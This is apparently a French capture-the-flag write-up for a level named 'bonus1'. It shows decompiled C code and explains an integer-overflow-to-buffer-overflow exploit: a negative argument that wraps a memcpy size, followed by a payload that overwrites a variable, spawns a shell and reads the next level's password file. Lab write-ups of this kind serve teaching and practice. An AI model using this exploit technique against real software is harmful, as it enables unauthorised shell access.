# Bonus 1
---
```c
int main(int argc, const char **argv){
	char dest[40];
	int v5;
	v5 = atoi(argv[1]);
	if ( v5 > 9 )
		return 1;
	memcpy(dest, argv[2], 4 * v5);
	if ( v5 == 1464814662 )
		execl("/bin/sh", "sh", 0);
	return 0;
}
```

on vois que __argv[1]__ et set dans un int, puis il est comparer pour voir si il est > 9

ensuite cette int est cette dans memcpy pour copier __argv[2]__ dans __dest[]__

len(dest) == 40

return atoi == int

third param memcpy == size_t (unsigned long long int)

avec c'est information on peut envoyer un nb negatif pour qu'il enderflow le size_t pour qu'il repasse en positif.

Le nombre choisi est -2147483637. Parce que size-t(-2147483637 * 4) == 44 

on execute donc la command:

```bash
./bonus1 -2147483637 $(python -c 'print "A" * 40 + "\x46\x4c\x4f\x57"')
```


Dans le terminal on execute la commande suivante pour récupérer le password de bonus2:

```bash
cat /home/user/bonus2/.pass
```